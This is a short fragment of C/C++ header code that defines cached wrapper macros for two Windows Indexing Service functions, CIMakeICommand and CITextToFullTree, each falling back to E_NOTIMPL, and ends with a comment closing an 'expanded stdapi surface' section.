DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_query_CIMakeICommand, WINAPI, QUERY_DLL, H_CIMakeICommand,
    (PVOID* ppCommand, ULONG cScope, DWORD* pdwDepths, LPWSTR* ppwszScopes, LPWSTR* ppwszCatalogs, LPWSTR* ppwszMachines),
    (ppCommand, cScope, pdwDepths, ppwszScopes, ppwszCatalogs, ppwszMachines), E_NOTIMPL)
DEFINE_CACHED_WINAPI_WRAPPER(HRESULT, winapi_query_CITextToFullTree, WINAPI, QUERY_DLL, H_CITextToFullTree,
    (LPCWSTR pwszRestriction, LPCWSTR pwszColumns, LPCWSTR pwszSortColumns, LPCWSTR pwszGroupings, PVOID* ppTree, ULONG cProperties, LPVOID* pPropertyDefinitions, LCID LocaleID),
    (pwszRestriction, pwszColumns, pwszSortColumns, pwszGroupings, ppTree, cProperties, pPropertyDefinitions, LocaleID), E_NOTIMPL)

// END: expanded stdapi surface
#endif
